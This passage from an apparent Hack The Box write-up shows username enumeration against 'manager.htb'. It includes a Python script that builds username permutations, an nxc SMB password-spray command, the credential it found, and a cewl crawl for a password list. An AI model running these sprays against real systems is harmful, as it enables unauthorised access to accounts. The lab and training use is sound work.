
---
## User Wordlist

Upon inspecting the webpage we found 3 potential usernames.

```
Thomas Bishop
James Ray
Toby Harlington
```

Store them in an users.txt wordlist.

Now use my custom tool (script below or on my GitHub)

```
python3 username_generator.py --all /ctfs/htb/ad/manager/creds/users.txt > users2.txt
```

Sprayed passwords with the generated wordlist and found an hit!

```
nxc smb manager.htb -u users.txt -p users2.txt
```

Gained valid domain user credentials.

```
Operator:operator
```

Script:

```
#!/usr/bin/env python3
"""
Penetration Testing Username Permutator
Generates common username patterns for brute-force attacks.

Usage:
  python3 username_generator.py users.txt            # read from file
  python3 username_generator.py -                    # read from stdin
  python3 username_generator.py users.txt --extended # with extra patterns

Input file: one username per line (e.g., 'John Doe' or 'jdoe').
"""

import sys
import argparse

def base_permutations(first: str, last: str):
    """Core patterns that were originally requested."""
    f = first.lower()
    l = last.lower()
    F = first.capitalize()
    L = last.capitalize()
    fi = f[0]

    yield fi + l               # jdoe
    yield l + fi               # doej
    yield l                    # doe
    yield f                    # john
    yield L + '.' + F          # Doe.John
    yield F + '.' + L          # John.Doe

def extended_permutations(first: str, last: str):
    """Additional enterprise username patterns."""
    f = first.lower()
    l = last.lower()
    F = first.upper()
    L = last.upper()
    fi = f[0]
    li = l[0]

    # Dotted variants
    yield f + '.' + l           # john.doe
    yield l + '.' + f           # doe.john
    yield F + '.' + L           # JOHN.DOE
    yield L + '.' + F           # DOE.JOHN

    # Underscore variants
    yield f + '_' + l           # john_doe
    yield l + '_' + f           # doe_john
    yield F + '_' + L           # JOHN_DOE
    yield L + '_' + F           # DOE_JOHN

    # Hyphen variants
    yield f + '-' + l           # john-doe
    yield l + '-' + f           # doe-john

    # Initials only
    yield fi + li               # jd
    yield li + fi               # dj
    yield fi + '.' + li         # j.d
    yield li + '.' + fi         # d.j

    # First name + last initial
    yield f + li                # johnd

    # First initial + dot + last name
    yield fi + '.' + l          # j.doe
    yield l + '.' + fi          # doe.j

    # Underscore with initial
    yield fi + '_' + l          # j_doe
    yield l + '_' + fi          # doe_j

    # Full concatenation
    yield f + l                 # johndoe
    yield l + f                 # doejohn

def main():
    parser = argparse.ArgumentParser(
        description="Generate username wordlist permutations for pen-testing.",
        epilog="If input file is omitted, the help is shown."
    )
    parser.add_argument(
        "input", nargs='?', default=None,
        help="Input file with usernames (one per line) or '-' for stdin."
    )
    parser.add_argument(
        "--suffixes", default="123,123!",
        help="Comma-separated suffixes to append to first/last name (default: 123,123!)."
    )
    parser.add_argument(
        "--extended", action="store_true",
        help="Include additional enterprise patterns (first.last, first_last, f.last, etc.)."
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Apply suffixes to ALL base permutations, not just first/last name."
    )

    # If no argument at all, show help and exit
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    # Require an input file or '-' for stdin
    if args.input is None:
        parser.error("the following arguments are required: input")

    suffixes = [s.strip() for s in args.suffixes.split(',') if s.strip()]

    # Read usernames
    names = []
    if args.input == "-":
        names = [line.strip() for line in sys.stdin if line.strip()]
    else:
        try:
            with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
                names = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: File '{args.input}' not found.", file=sys.stderr)
            sys.exit(1)

    output_words = set()

    for line in names:
        parts = line.split()
        if len(parts) >= 2:
            first = parts[0]
            last = parts[-1]
        else:
            first = last = parts[0]   # single word → treat as both

        # Generate base patterns
        all_variants = list(base_permutations(first, last))
        if args.extended:
            all_variants.extend(extended_permutations(first, last))

        # Suffix targets: simple first/last name, or all if --all
        suffix_targets = all_variants if args.all else [first.lower(), last.lower()]

        for word in all_variants:
            output_words.add(word)
        for word in suffix_targets:
            for suf in suffixes:
                output_words.add(word + suf)

    for w in sorted(output_words):
        print(w)

if __name__ == "__main__":
    main()

```

---
## Password Wordlist

Since we don't got any passwords yet. Let's create an passwords.txt wordlist by utilizing an tool called cewl which crawls the whole website.

```
cewl http://painters.htb -x 15 -o -w passwords.txt
```
